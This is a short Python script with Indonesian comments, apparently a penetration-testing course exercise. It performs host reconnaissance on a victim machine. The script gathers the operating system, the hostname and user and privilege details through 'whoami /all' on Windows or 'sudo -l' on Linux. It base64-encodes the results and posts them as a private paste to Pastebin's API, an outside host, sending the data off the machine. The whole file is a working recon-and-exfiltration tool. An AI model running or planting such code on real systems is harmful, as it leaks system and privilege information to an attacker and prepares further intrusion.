import base64
import platform
import sys
import socket
from subprocess import PIPE
from subprocess import Popen
from platform import system
from requests.api import post

#Disini kita declare untuk link api dan key api
API_URL = 'https://pastebin.com/api/api_post.php'
API_KEY = "<ISI_DENGAN_KEY_API_YANG_DIMILIKI>"


message = "Reconnaissance Result : \n"
#disini kita akan menunjukkan OS yang dipakai oleh User
message += f"Operating System: {platform.platform()}\n"

#disini adalah proses untuk menunjukkan hostname, info user ,info group, privilege 
if system() == "Windows":
    hostname =(socket.gethostname())
    
    process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, err = process.communicate()

elif system() == "Linux":
    hostname = (socket.gethostname())
    
    process = Popen("sudo -l", stdin=PIPE , stdout=PIPE, stderr=PIPE, shell =True)
    result, err = process.communicate()

#disini kalau resultnya tidak ada, maka kita akan ambil pesan erornya, kalau ada isinya maka kita akan masukkan  hostname, info user ,info group, privilege yang sudah didapat
#kedalam message
if result == b'':
    message += err.decode()
else:
    message += hostname
    message += result.decode()

#kemudian disini kita lakukan encoding dengan base64
messages = base64.b64encode(message.encode())

print(messages)

#disini kita buat request untuk dikirim ke api pastebin
data_pastebin = {
    'api_dev_key': API_KEY, 
    'api_option': 'paste',
    'api_paste_private': '1',
    'api_paste_code': messages,
    'api_paste_name': 'GLS Progpen Host_Recon_PasteBin'
}
#disini kita mengirikannya dengan method post
pastebin = post(url=API_URL, data=data_pastebin)
#kita print status code method postnya
print(f"Status code: {pastebin.status_code}")
#kemudian kita print link / url pastebinnya
pastebin_link = pastebin.text
print(f"Pastebin Link: {pastebin_link}")







